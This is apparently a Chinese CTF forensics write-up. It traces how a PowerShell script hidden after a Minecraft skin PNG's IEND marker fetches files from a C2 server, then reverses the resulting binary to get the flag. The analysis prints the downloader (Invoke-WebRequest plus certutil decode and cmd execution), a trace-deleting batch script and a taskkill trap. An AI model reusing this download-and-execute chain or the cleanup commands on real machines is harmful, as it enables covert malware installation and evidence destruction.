# NSYSU IDSCTF Forensics — forensic2 解題報告

## 題目資訊

- **平台**: idsctf.mis.nsysu.edu.tw / Facebook CTF
- **類型**: Forensics
- **分數**: 100 分
- **出題者**: 苦碩JJ青衫濕

## 題目描述

> I am an ardent gamer, deeply immersed in the realms of countless video games.
> Yet, tragedy befell me when an insidious virus struck me, altering the course of my digital existence.
> Alas, it is whispered that one of my cherished games harbors a vulnerability, a hidden flaw that grants hackers access to unleash nefarious files upon my very computer.
> In a desperate plea for aid, I have entrusted you with the entirety of my user directory, for you alone hold the power to unravel the enigma of this grievous incident!

題目提供受害者 Peter 的完整 user directory 作為鑑識素材。

## Flag

```
flag{vulns_c4N_b_pLaYing_g4me}
```

---

## 解題思路

以下按照「每一步怎麼知道要往哪個方向查」的邏輯說明。每一步都是前一步的結果告訴你下一步該看哪裡。

### 線索 1：從題目提示找到 Minecraft

題目說「Peter 是重度玩家，電腦遭遊戲漏洞利用」。所以第一件事是翻 `Appdata/` 找遊戲相關目錄。找到以下遊戲：

- **Minecraft**（v1.12.2 + Forge + Pixelmon mods）
- Witcher 3
- PuyoVS
- OpenMPT（音樂追蹤器軟體）

其中 Minecraft 使用了 **log4j 2.8.1**，這是一個存在嚴重 RCE 漏洞（Log4Shell, CVE-2021-44228）的版本。這就是題目所說的「遊戲中的漏洞」。

### 線索 2：聊天紀錄暴露密碼

既然找到 Minecraft，自然要看遊戲紀錄。`latest.log` 是 Big5 編碼，解碼後看到關鍵對話：

```
<Peter> 酷吧~我把檔案傳到RC，密碼是：z; rmp4ru,6
```

Peter 把某個檔案傳給朋友，還附上密碼。有密碼代表某處一定有加密檔案。

後續聊天中 Peter 也提到「乾，我電腦怪怪的ㄟ」，暗示電腦已經中毒。

### 線索 3：用密碼解開加密壓縮檔

在 `Pictures/` 找到 `skin.7z`，是加密的 7z 壓縮檔。用密碼 `z; rmp4ru,6` 解壓，得到 `skin.png`。

為什麼注意到它？因為 Minecraft skin 只是一個小圖片，正常不需要加密壓縮。加密 = 可疑。

### 線索 4：skin.png 檔案大小不對

Minecraft skin 是 64x32 像素的 PNG，正常約 1400~1500 bytes。但這個 skin.png 有 1929 bytes，多了近 500 bytes。

用 hex editor 或 Python 找 PNG 的 IEND 標記（`49 45 4E 44`）。IEND 是 PNG 格式的結尾標誌，在它之後不應該有任何資料。但這個檔案在 IEND 之後還有 458 bytes — 這是一種常見的隱寫術手法：把資料藏在合法檔案的尾部。

### 線索 5：尾部藏的是 PowerShell 惡意腳本

那 458 bytes 是一段 PowerShell 腳本，從 C2 伺服器下載**三個檔案**：

```powershell
$url  = "http://140.117.80.61:9018/fbctf.pub"
$url2 = "http://140.117.80.61:9018/fbctf.pem"
$url3 = "http://140.117.80.61:9018/flag.php"
Invoke-WebRequest -Uri $url  -OutFile $output
Invoke-WebRequest -Uri $url2 -OutFile $output1
Invoke-WebRequest -Uri $url3 -OutFile $output2
certutil.exe -decode -Unicode $output java.exe
cmd.exe /c $output1
```

這段腳本做了三件事：

1. 從 C2 伺服器（`140.117.80.61:9018`，NSYSU 校內 IP）下載 `fbctf.pub`、`fbctf.pem`、`flag.php`
2. 用 `certutil.exe -decode` 將 `fbctf.pub`（Base64 編碼）解碼為 `java.exe`（偽裝成 Java 的惡意執行檔）
3. 用 `cmd.exe /c` 執行 `fbctf.pem`（清理用 batch script）

最重要的資訊是：**C2 伺服器位址和三個檔案的 URL**。那麼下一步就是存取這些 URL，看能拿到什麼。

### 線索 6：連校內 VPN 存取 C2 伺服器

`140.117.80.61` 是**中山大學校內 IP**（140.117.0.0/16 是 NSYSU 的網段），從外網無法連線。這裡有一個隱藏的解題關卡：**你必須認出這是校內 IP，然後連上中山大學的校內 VPN 才能存取 C2 伺服器。**

連上 VPN 後，逐一存取三個 URL：

#### flag.php — 誘餌

```
GET http://140.117.80.61:9018/flag.php
```

回應是一個 HTML 頁面，顯示 `flag.jpg` 圖片：

```html
<!DOCTYPE html>
<html>
<body>
<img src="flag.jpg" alt="403 Forbidden!!">
</body>
</html>
```

下載 `flag.jpg` 打開一看：「404 Not Found / 這裡沒有你想要的 FLAG 喔」。這是出題者設下的**誘餌**，故意讓你以為 flag 在這個 URL，實際上什麼都沒有。

#### fbctf.pem — 清理腳本（38 bytes）

```batch
move java.exe %temp%
del fbctf*
exit
```

這是一個 batch script，作用是：把解碼出的 `java.exe` 移到暫存目錄，然後刪除所有 `fbctf*` 開頭的檔案（清除攻擊痕跡）。這也解釋了為什麼鑑識映像中找不到這些檔案。

#### fbctf.pub — 真正的惡意執行檔（Base64 編碼）

這才是核心檔案：183,536 bytes 的 Base64 編碼資料。用 PowerShell 腳本中的同一指令解碼：

```bash
certutil.exe -decode fbctf.pub decoded.bin
```

解碼後得到 133,440 bytes 的 **x86_64 MinGW PE 執行檔**（GCC 4.9.2 tdm64-1 編譯，原始碼檔名 `flag.cpp`）。這就是在 Peter 電腦上以 `java.exe` 名稱執行的惡意程式。

### 線索 7：先嘗試執行，碰壁後再逆向

拿到執行檔後，先直接嘗試執行看看會發生什麼：

```
PS> .\flag.exe
Wrong, fxck off!
```

程式拒絕了，需要正確的「密碼」（實際上是命令列參數）。嘗試了多種密碼都失敗：

- `minecraft_skin_parser`、`stone`（從字串分析中找到的）
- `z; rmp4ru,6`（skin.7z 的密碼）
- `gmbh`、`hahahahahaha{hehehehehehehehe}`
- `3f4cd18114c94884be2da98c41f20e74`（竊取的 access token）
- `Rand_Nsysu`、`Peter`

也嘗試直接猜 flag 的排列組合（如 `FLAG{pLaYing_g4me_c4N_b_vulns}`），但無法確認正確順序。

暴力猜測行不通，必須逆向工程。

### 線索 8：為什麼先提取字串？

逆向工程的第一步永遠不是直接讀組語（assembly）。組語很難讀，效率極低。正確的做法是先用 `strings` 指令或 `objdump -s -j .rdata` 提取程式中所有寫死的字串。

**為什麼這樣做有用？** 因為程式設計師在原始碼中寫的所有文字：

- 錯誤訊息（`"Wrong, fxck off!"`）
- 要比較的常數（`"minecraft_skin_parser"`）
- 格式字串（`"%c%s%s%s%s%c"`）
- 系統指令（`"taskkill /f /im explorer.exe"`）

在編譯後會**原封不動**地出現在可執行檔的 `.rdata` 區段（唯讀資料區段）。提取這些字串，等於讓程式自己告訴你它會做什麼。

在這個執行檔中，提取出的重要字串有：

```
"Wrong, fxck off!"                 ← 我們剛看到的錯誤訊息
"Sorry, the computer crashed."     ← 另一個假錯誤訊息
"minecraft_skin_parser"            ← 看起來像是要比較的命令列參數
"stone"                            ← 同上
"gmbh"                             ← 4 個字母，用途不明，先記著
"vulns"                            ← 像英文單字片段
"_c4N_b_"                          ← 像 leet speak：can be
"pLaYing"                          ← playing
"_g4me"                            ← game
"%c%s%s%s%s%c"                     ← printf 格式字串
"hahahahahaha{hehehehehehehehe}"   ← 看起來像 flag 但內容是廢話
"taskkill /f /im explorer.exe"     ← Windows 指令：強制終止桌面程序
```

### 線索 9：從字串推斷程式行為

光看這些字串，不需要讀任何組語，就能推斷出很多事：

**推斷 1：程式需要多個命令列參數。**
`"minecraft_skin_parser"` 和 `"stone"` 出現在字串中，而且 PowerShell 腳本執行 java.exe 時也沒有帶這些參數（腳本只是呼叫 `cmd.exe /c $output1`）。這些字串很可能是程式用 `strcmp` 檢查 `argv[1]` 和 `argv[2]` 的比較值。之前直接執行 `.\flag.exe` 沒帶參數才會被拒絕。

**推斷 2：`"%c%s%s%s%s%c"` 是在組裝 flag。**
這是 C 語言 `printf` 的格式字串。`%c` 會印出一個字元，`%s` 會印出一個字串。所以這行 printf 會把 **2 個字元 + 4 個字串** 按順序串接起來印出。
在 CTF 的語境下，flag 格式通常是 `flag{...}`。所以兩個 `%c` 極有可能是 `{` 和 `}`，四個 `%s` 就是中間的內容片段。

**推斷 3：那 4 個片段就是 flag 的內容。**
`"vulns"`、`"_c4N_b_"`、`"pLaYing"`、`"_g4me"` — 每個都像英文單字的變體，合在一起讀起來像一句話。這 4 個字串搭配 `%c%s%s%s%s%c` 的 4 個 `%s`，數量完全吻合。

**推斷 4：`"hahahahahaha{hehehehehehehehe}"` 是誘餌。**
雖然它有 `{}` 的格式，但內容是哈哈呵呵，毫無意義。出題者放這個是為了讓粗心的參賽者以為找到了 flag。

**推斷 5：`"taskkill /f /im explorer.exe"` 是陷阱。**
這個 Windows 指令會強制終止 `explorer.exe`（Windows 桌面程序），導致桌面消失、工作列不見。程式在某些條件下會執行這個指令作為「懲罰」。

**此時的問題：順序。**
4 個字串有 4! = 24 種排列方式。你可以猜，但 CTF 通常只接受唯一正確答案。為了確認順序，必須讀組語。

### 線索 10：讀組語確定 printf 的參數順序

目標很明確：找到 `call printf` 那行指令，然後看它前面的指令把哪個字串放進哪個參數位置。

**背景知識：Windows x64 呼叫慣例。**
在 Windows 64 位元系統上，呼叫函數時，參數的傳遞方式是固定的：

| 第幾個參數 | 放在哪裡 |
|------------|----------|
| 第 1 個 | RCX 暫存器 |
| 第 2 個 | RDX 暫存器 |
| 第 3 個 | R8 暫存器 |
| 第 4 個 | R9 暫存器 |
| 第 5 個 | 堆疊 [RSP+0x20] |
| 第 6 個 | 堆疊 [RSP+0x28] |
| 第 7 個 | 堆疊 [RSP+0x30] |

所以只要看 `call printf` 之前，每個暫存器和堆疊位置被設成什麼值，就知道 printf 每個 `%` 對應的參數。

**實際的組語（`call printf` 前的指令）：**

```nasm
; 先把格式字串的記憶體位址載入 RAX
lea    rax, [rip+0x2972]           ; RAX 指向 "%c%s%s%s%s%c"

; 設定第 7 個參數（對應最後一個 %c）→ 堆疊 [RSP+0x30]
mov    DWORD PTR [rsp+0x30], 0x7d  ; 0x7D 是 ASCII 碼，查表得到 '}'

; 設定第 6 個參數（對應第 4 個 %s）→ 堆疊 [RSP+0x28]
lea    r10, [rip+0x294f]           ; R10 指向某個字串（稍後解釋怎麼知道是哪個）
mov    QWORD PTR [rsp+0x28], r10   ; 把該字串位址存入堆疊

; 設定第 5 個參數（對應第 3 個 %s）→ 堆疊 [RSP+0x20]
lea    r10, [rip+0x294f]           ; R10 指向另一個字串
mov    QWORD PTR [rsp+0x20], r10

; 設定第 4 個參數 → R9
lea    r9, [rip+0x292f]            ; R9 指向某個字串

; 設定第 3 個參數 → R8
lea    r8, [rip+0x2936]            ; R8 指向某個字串

; 設定第 2 個參數（對應第 1 個 %c）→ RDX
mov    edx, 0x7b                   ; 0x7B 是 ASCII 碼，查表得到 '{'

; 設定第 1 個參數（格式字串本身）→ RCX
mov    rcx, rax                    ; RCX = "%c%s%s%s%s%c" 的位址

call   printf
```

**怎麼知道 `lea r10, [rip+0x294f]` 指向哪個字串？**

`lea r10, [rip+0x294f]` 的意思是「把 `當前指令位址 + 0x294f` 的結果存入 R10」。這是 x86_64 的相對定址（RIP-relative addressing），用來載入一個記憶體位址。

具體計算：假設這條 `lea` 指令在位址 `0x401753`，那它載入的位址就是 `0x401753 + 7（指令長度）+ 0x294f = 0x4040a9`。查前面的字串表，`0x4040a9` 就是 `"_g4me"`。

objdump 工具會自動幫你算好這些位址，所以實際操作中不需要手算。

**整理成完整的對應表：**

| printf 參數 | 格式 | 暫存器/堆疊 | 值 | 怎麼得知 |
|-------------|------|-------------|-----|----------|
| 第 1 個 | 格式字串 | RCX | `"%c%s%s%s%s%c"` | `lea` 指向 0x4040bd |
| 第 2 個 | `%c` | RDX | `{` | `mov edx, 0x7b`，0x7B = ASCII `{` |
| 第 3 個 | `%s` | R8 | `"vulns"` | `lea` 指向 0x4040af |
| 第 4 個 | `%s` | R9 | `"_c4N_b_"` | `lea` 指向 0x4040a1 |
| 第 5 個 | `%s` | [RSP+0x20] | `"pLaYing"` | `lea` 指向 0x4040b5 |
| 第 6 個 | `%s` | [RSP+0x28] | `"_g4me"` | `lea` 指向 0x4040a9 |
| 第 7 個 | `%c` | [RSP+0x30] | `}` | `mov ..., 0x7d`，0x7D = ASCII `}` |

所以 printf 實際執行的等同於：

```c
printf("%c%s%s%s%s%c", '{', "vulns", "_c4N_b_", "pLaYing", "_g4me", '}');
```

輸出結果：**`{vulns_c4N_b_pLaYing_g4me}`**

### 線索 11：驗證函數揭露 flag prefix

還剩 `"gmbh"` 沒解釋。在 main() 的組語中，printf 之前先呼叫了一個函數 `_Z14_0x0000ff14ad_Pcs`，參數是 `"gmbh"` 和 `argv[3][0]`（第三個命令列參數的第一個字元）。

逆向這個函數後，發現兩件事：

**第一，字串解碼迴圈：**

函數中有一個迴圈，對 `"gmbh"` 的每個字元做 `byte - 1` 的運算：

```
'g' (0x67) - 1 = 'f' (0x66)
'm' (0x6D) - 1 = 'l' (0x6C)
'b' (0x62) - 1 = 'a' (0x61)
'h' (0x68) - 1 = 'g' (0x67)
```

得到 `"flag"` — 這就是 CTF flag 的 prefix。出題者用「每個字母向後移一位」的簡單加密來隱藏它。

**第二，密鑰檢查和陷阱：**

函數接著檢查 `argv[3][0]` 是否等於 `0x7E`（ASCII 的 `~`）：

- 等於 `~` → 驗證通過，回到 main() 繼續執行 printf 印出 flag
- 不等於 `~` → 執行 `system("taskkill /f /im explorer.exe")`，殺掉 Windows 桌面

Peter 桌面上 11 個 .lnk 全損壞，就是 explorer.exe 被殺死造成的。

### 最終拼接

- **prefix**：驗證函數解碼 `"gmbh"` 得到 `"flag"`
- **內容**：printf 拼接 `{vulns_c4N_b_pLaYing_g4me}`

```
flag{vulns_c4N_b_pLaYing_g4me}
```

語意：**vulns can be playing game** — 漏洞可以藏在玩遊戲之中，呼應題目「遊戲漏洞利用」的主題。

### 線索鏈總覽

```
題目提示「遊戲漏洞」
  → 找到 .minecraft/ 目錄（log4j 2.8.1 漏洞）
    → 讀聊天紀錄，取得密碼 z; rmp4ru,6
      → 解壓 skin.7z 得到 skin.png
        → 發現 PNG 尾部（IEND 之後）藏 PowerShell 腳本
          → PowerShell 揭露 C2 位址（校內 IP）與三個下載 URL
            → 連校內 VPN 存取 C2 伺服器
              → flag.php 是誘餌（顯示「這裡沒有 FLAG」圖片）
              → fbctf.pem 是清理腳本
              → fbctf.pub 才是真正的 Base64 編碼執行檔
                → certutil 解碼得到 decoded.bin（偽裝為 java.exe）
                  → 直接執行被拒（"Wrong, fxck off!"），需逆向
                    → 提取 .rdata 字串，發現 flag 片段和 printf 格式
                      → 反組譯 printf 呼叫，用呼叫慣例確定片段順序
                        → 驗證函數解碼 "gmbh" → "flag"（prefix）
                          → flag{vulns_c4N_b_pLaYing_g4me}
```

---

## 完整攻擊鏈

```
2018-04-20（台灣時間 UTC+8）

01:53  Peter 在 Minecraft 聊天中提到 skin.png，並分享到 RC
       密碼：z; rmp4ru,6
       │
       ▼
       skin.png 被下載並以某種方式觸發
       （PNG IEND 之後附帶 PowerShell payload）
       │
       ▼
       PowerShell 從 C2（140.117.80.61:9018）下載三個檔案：
       - fbctf.pub（Base64 編碼的惡意執行檔）
       - fbctf.pem（清理用 batch script）
       - flag.php（誘餌網頁）
       │
       ▼
       certutil.exe -decode fbctf.pub java.exe
       （將 Base64 解碼為 PE 執行檔，偽裝為 java.exe）
       │
       ▼
       cmd.exe /c fbctf.pem
       （移動 java.exe 到 %temp%，刪除 fbctf* 痕跡）
       │
       ▼
       java.exe 執行：
       ├─ 竊取 Minecraft 憑證（存入 .~jvm_arg）
       ├─ 破壞所有桌面捷徑（覆寫為 170 byte stub）
       ├─ 執行 taskkill /f /im explorer.exe（關閉桌面）
       └─ 顯示 "Sorry, the computer crashed." 假錯誤訊息
       │
       ▼
02:57  所有桌面捷徑同時被破壞
       │
       ▼
13:50  Peter 回報「乾，我電腦怪怪的ㄟ」
```

---

## C2 伺服器檔案清單

| URL | 大小 | 實際內容 |
|-----|------|----------|
| `/flag.php` | — | 誘餌 HTML 頁面，顯示 flag.jpg |
| `/flag.jpg` | 439,210 bytes | 誘餌圖片：「404 Not Found / 這裡沒有你想要的 FLAG 喔」 |
| `/fbctf.pub` | 183,536 bytes | Base64 編碼的惡意 PE 執行檔（解碼後 133,440 bytes） |
| `/fbctf.pem` | 38 bytes | 清理用 batch script（移動 java.exe、刪除 fbctf*） |

---

## 詳細技術分析

### 鑑識映像結構

```
Peter/
├── Appdata/
│   ├── Local/
│   │   ├── Notepad++/.~jvm_arg          ← 被竊取的 Minecraft 憑證
│   │   │                                   (Username: Rand_Nsysu,
│   │   │                                    Token: 3f4cd18114c94884be2da98c41f20e74)
│   │   └── PuyoVS/Settings.json         ← 遊戲設定（含 MD5 hash，誘餌）
│   ├── Roaming/
│   │   ├── .minecraft/                   ← Minecraft 完整目錄
│   │   │   ├── logs/latest.log           ← 遊戲聊天紀錄（Big5 編碼）
│   │   │   ├── config/pixelmon.hocon     ← 含假 flag 誘餌
│   │   │   └── mods/                     ← Forge + Pixelmon mod
│   │   └── OpenMPT/mptrack.ini           ← 音樂編輯器設定
├── Desktop/*.lnk                         ← 11 個被破壞的捷徑檔案
└── Pictures/skin.7z                      ← 加密壓縮的 Minecraft skin
```

### skin.png 結構

```
Offset     內容
────────────────────────────────────
00000000   89 50 4E 47 ...           PNG 標準檔頭
...
000005BB   00 00 00 00 49 45 4E 44   IEND chunk（PNG 結尾標記）
000005C3   AE 42 60 82               IEND CRC
000005C7   [458 bytes 額外資料]       PowerShell 惡意腳本
```

### decoded.bin .rdata 字串表

| 位址 | 內容 | 用途 |
|------|------|------|
| `0x404000` | `hahahahahaha{hehehehehehehehe}` | 誘餌假 flag |
| `0x40401f` | `taskkill /f /im explorer.exe` | 驗證失敗時的陷阱指令 |
| `0x40406e` | `minecraft_skin_parser` | argv[1] 驗證字串 |
| `0x404084` | `stone` | argv[2] 驗證字串 |
| `0x40409c` | `gmbh` | 編碼後的 "flag"（每 byte 減 1） |
| `0x4040a1` | `_c4N_b_` | flag 片段 |
| `0x4040a9` | `_g4me` | flag 片段 |
| `0x4040af` | `vulns` | flag 片段 |
| `0x4040b5` | `pLaYing` | flag 片段 |
| `0x4040bd` | `%c%s%s%s%s%c` | flag 輸出格式字串 |

### main() 反組譯 (0x401682)

```nasm
; === 參數數量檢查 ===
0x40169a:  cmp    DWORD PTR [rbp-0x4], 0x3
0x40169e:  jg     0x4016b2                ; argc > 3 才繼續

; === argv[1] == "minecraft_skin_parser" ===
0x4016b2:  mov    rax, QWORD PTR [rbp-0x10]
0x4016b6:  add    rax, 0x8                 ; argv[1]
0x4016ba:  mov    rax, QWORD PTR [rax]
0x4016c4:  lea    rdx, [rip+0x29a3]       ; "minecraft_skin_parser" (0x40406e)
0x4016cb:  mov    rcx, rax
0x4016ce:  call   strcmp

; === argv[2] == "stone" ===
0x4016e8:  lea    rdx, [rip+0x2995]       ; "stone" (0x404084)
0x4016ef:  mov    rcx, rax
0x4016f2:  call   strcmp

; === 呼叫驗證函數 ===
0x401718:  movzx  eax, BYTE PTR [rax]     ; argv[3][0]
0x40171b:  movsx  ax, al
0x40171f:  lea    rdx, [rip+0x2976]       ; "gmbh" (0x40409c)
0x401726:  movzx  eax, ax
0x401729:  mov    rcx, rdx                ; RCX = "gmbh"
0x40172c:  mov    dx, ax                  ; DX = argv[3][0]
0x40172f:  call   _Z14_0x0000ff14ad_Pcs   ; 驗證函數

; === 輸出 flag（printf 呼叫）===
0x401744:  lea    rax, [rip+0x2972]       ; "%c%s%s%s%s%c" (0x4040bd)
0x40174b:  mov    DWORD PTR [rsp+0x30], 0x7d  ; '}' → 第7參數（堆疊）
0x401753:  lea    r10, [rip+0x294f]       ; "_g4me" (0x4040a9)
0x40175a:  mov    QWORD PTR [rsp+0x28], r10   ; 第6參數（堆疊）
0x40175f:  lea    r10, [rip+0x294f]       ; "pLaYing" (0x4040b5)
0x401766:  mov    QWORD PTR [rsp+0x20], r10   ; 第5參數（堆疊）
0x40176b:  lea    r9, [rip+0x292f]        ; "_c4N_b_" (0x4040a1) → R9
0x401772:  lea    r8, [rip+0x2936]        ; "vulns" (0x4040af)   → R8
0x401779:  mov    edx, 0x7b               ; '{' → RDX
0x40177e:  mov    rcx, rax                ; 格式字串 → RCX
0x401781:  call   printf
```

### 驗證函數 `_0x0000ff14ad_` (0x401530)

C++ mangled name `_Z14_0x0000ff14ad_Pcs` 解碼為 `_0x0000ff14ad_(char*, short)`。

```nasm
; === 字串解碼迴圈：每個 byte 減 1 ===
0x401568:  movzx  eax, BYTE PTR [rdx+rax*1]  ; 讀取 "gmbh" 的每個字元
0x40156c:  sub    eax, 0x1                     ; byte - 1
0x40156f:  mov    BYTE PTR [rcx+rax*1], al     ; 存回
;
; 解碼結果：'g'-1='f', 'm'-1='l', 'b'-1='a', 'h'-1='g' → "flag"

; === 密鑰驗證 ===
0x4015c8:  cmp    WORD PTR [rbp+0x18], 0x7e   ; argv[3][0] == '~' ?
0x4015cd:  je     0x4015f5                      ; 正確 → 返回，繼續印出 flag

; === 陷阱（密鑰錯誤時觸發）===
0x4015cf:  lea    rcx, [rip+0x2a49]           ; "taskkill /f /im explorer.exe"
0x4015d6:  call   system                        ; 殺掉 Windows 桌面
```

---

## 誘餌與陷阱一覽

| 項目 | 位置 | 內容 |
|------|------|------|
| 假 flag 1 | `pixelmon.hocon` | `flag="This is not flag, cc"` |
| 假 flag 2 | `.rdata 0x404000` | `hahahahahaha{hehehehehehehehe}` |
| 假 flag 3 | C2 `/flag.php` → `/flag.jpg` | 「404 Not Found / 這裡沒有你想要的 FLAG 喔」 |
| 陷阱 | `.rdata 0x40401f` | 密鑰錯誤時執行 `taskkill /f /im explorer.exe` |
| 誘餌 hash | `PuyoVS/Settings.json` | MD5 `50bbed33b6e7ea980d16b9a47c5fbd3f`（無關 flag） |
| 假翻譯 | QTranslate 紀錄 | Peter 翻譯了 "flag" → "旗幟" |

---

## 佐證

### mptrack.ini

OpenMPT 設定檔的 Recent File List 記載：

```ini
File0=D:\Desktop\捷徑\ctf\FBCTF題目\forensic\flag.it
```

確認題目來源為 FBCTF，`.it` 副檔名為 Impulse Tracker 音樂格式（OpenMPT 可開啟）。

### 被竊取的憑證

`.~jvm_arg` 檔案中包含被竊取的 Minecraft 帳號：

- Username: `Rand_Nsysu`
- Access token: `3f4cd18114c94884be2da98c41f20e74`

### 遠端協助紀錄

2018-01-21 的 remote assistance 紀錄：Rand 連線幫助 Peter，說「差不多 連連線都有問題了，之後我幫你重灌」。

---

## 使用工具

- **7-Zip**：解壓加密的 `skin.7z`
- **Python**：PNG 結構分析、Big5 編碼解讀、hex 分析
- **objdump**（MinGW binutils）：x86_64 反組譯（Intel syntax）
- **strings / hexdump**：.rdata 字串提取與二進位分析
- **certutil**：解碼 Base64 編碼的 fbctf.pub
- **校內 VPN**：連線至 NSYSU 內網存取 C2 伺服器
